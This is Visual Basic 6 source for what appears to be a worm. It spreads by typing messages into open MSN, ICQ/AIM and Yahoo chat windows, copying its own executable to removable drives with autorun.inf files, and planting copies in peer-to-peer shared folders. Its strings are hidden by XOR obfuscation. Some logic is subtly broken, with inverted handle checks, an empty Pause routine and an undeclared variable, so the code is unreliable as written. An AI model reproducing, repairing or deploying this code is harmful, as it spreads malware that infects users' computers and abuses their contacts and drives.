Attribute VB_Name = "modIM"
Option Explicit
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)
Public Type POINTAPI
        X As Long
        y As Long
End Type
Public Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function SetForegroundWindow Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long

Private Const GHND = &H42
Private Const CF_HDROP = &HF
Private Const GET_DROP_COUNT = &HFFFFFFFF

Public Const WM_SETTEXT = &HC
Public Const WM_KEYDOWN = &H100
Public Const GW_HWNDNEXT = 2
Public Const GW_CHILD = 5
Public Const VK_SHIFT = &H10
Public Const VK_CTRL = &H11
Public Const VK_ALT = &H12
Public Const VK_CAPITAL = &H14
Public Const VK_RETURN As Long = &HD
Public Const VK_SEPARATOR As Long = &H6C
Public Const VK_LSHIFT As Long = &HA0
Public Const VK_RSHIFT As Long = &HA1

Private Type DROPFILES
   pFiles As Long
   pt As POINTAPI
   fNC As Long
   fWide As Long
End Type

Dim iCounter As Integer
Dim DF As DROPFILES
Dim strFiles As String
Dim hGlobal As Long
Dim lpGlobal As Long
Dim hDrop As Long
Dim lFiles As Long
Dim strFile As String

Public Sub SetPSM(ByVal strMsg As String)
    On Error Resume Next
    Dim Handle As Long, i As Long
    
    Handle = FindWindow(strXOR("2C3E231D0B171B03261F1507162", "test", False), vbNullString)                            'Get the conversation-handle
    
    If Handle = 0 Then
        If Handle = 0 Then Exit Sub                                                 'Make sure that we have a handle
        Call ShowWindow(Handle, 1)                                                  'If minimized, then restore window
        Call SetForegroundWindow(Handle)                                            'Set focus
            
        SendKeys strMsg                                                             'Set the message
        SendKeys strXOR("4708313A3136260947", "test", False)                                                        'Send the message and close the conversation
    End If

    Yah_SendAct strMsg
    Call IAShare(strMsg)                                                       'Send message via ICQ and AIM
End Sub

Public Sub Pause(HowLong)
    On Error Resume Next
    Dim timeout
End Sub

Private Sub IAShare(ByVal strMsg As String)
    Dim wnd As Long
    wnd = FindWindow(strXOR("3A2C1B0C23011519005D17180400072B3A", "test", False), vbNullString) 'Both of them are using __oxFrame.class__ as windowclass
    If wnd = 0 Then
        Call ShowWindow(wnd, 1)
        Call SetForegroundWindow(wnd)
        
        SendKeys strMsg
        SendKeys strXOR("1E363A202021090F20203709", "test", False)
    End If
End Sub

Private Sub Yah_SendAct(ByVal Msg As String)
    Dim wnd As Long, meswnd As Long, lhndchild As Long
    Dim StrClass As String * 255
    Dim i As Integer
    
    wnd = FindWindow(strXOR("3C20111517101C39001D01230B173718040007", "test", False), vbNullString)
    wnd = FindWindowEx(wnd, 0&, strXOR("2C3E3718040007", "test", False), vbNullString)
    
    If wnd = 0 Then
        lhndchild = GetWindow(wnd, GW_CHILD)
        Call GetClassName(lhndchild, StrClass, 255)
        PostMessage meswnd, WM_KEYDOWN, VK_RETURN, 0
        i = InStr(StrClass, strXOR("3C3A393D0B030100321A1A100A042", "test", False))
        If i > 0 Then
            SendMessageByString meswnd, WM_SETTEXT, 0, Msg
            Exit Sub
        End If
    
        Do
            lhndchild = GetWindow(lhndchild, GW_HWNDNEXT)
            If lhndchild = 0 Then Exit Do
            
            Call GetClassName(lhndchild, StrClass, 255)
            i = InStr(StrClass, strXOR("3C3A393D0B030100321A1A100A04", "test", False))
            If i > 0 Then
                SendMessageByString lhndchild, WM_SETTEXT, 0, Msg
                PostMessage lhndchild, WM_KEYDOWN, VK_RETURN, 0
                Exit Sub
            End If
        Loop
    End If
End Sub

Public Sub USBClone()
    On Error Resume Next
    Call CallAPI("Kernel32.dll", "CopyFileA", App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe", strXOR("224928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("Kernel32.dll", "CopyFileA", App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe", strXOR("2D4928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("Kernel32.dll", "CopyFileA", App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe", strXOR("234928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("Kernel32.dll", "CopyFileA", App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe", strXOR("2F4928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("Kernel32.dll", "CopyFileA", App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe", strXOR("214928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("Kernel32.dll", "CopyFileA", App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe", strXOR("2C4928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    ff = FreeFile
    
    Open strXOR("2249283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Open strXOR("2D49283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    Open strXOR("2349283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    Open strXOR("2F49283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    Open strXOR("2149283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    Open strXOR("2C49283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
End Sub
Public Sub P2P_Add()
    On Error Resume Next
    Dim AppPath As String, kPath As String, mPath As String
    AppPath = App.Path & strXOR("472F56", "test", False) & App.EXEName & ".exe"
    kPath = GetSettingString(&H80000002, strXOR("39203B3231243526202F3F353F323528291C171509301B1A11161A00", "temp", False), "Dir0")
    mPath = GetSettingString(&H80000002, strXOR("39203B3231243526202F391B17031C111000", "temp", False), "Install_Dir")
    
    Call CallAPI("Kernel32.dll", "CopyFileA", AppPath, Environ(strXOR("15011B13171219120C1F1107", "test", False)) & strXOR("393F1D1900241D06002F271C0401111039", "test", False) & App.EXEName & ".exe", False)
    Call CallAPI("Kernel32.dll", "CopyFileA", AppPath, Environ(strXOR("15011B13171219120C1F1107", "test", False)) & strXOR("3916301B0B18110D57434444391A1A170A1E1D1A022F", "test", False) & App.EXEName & ".exe", False)
    
    Call CallAPI("Kernel32.dll", "CopyFileA", AppPath, kPath & strXOR("472F56", "test", False) & App.EXEName & ".exe", False)
    Call CallAPI("Kernel32.dll", "CopyFileA", AppPath, mPath & strXOR("472F56", "test", False) & App.EXEName & ".exe", False)
End Sub


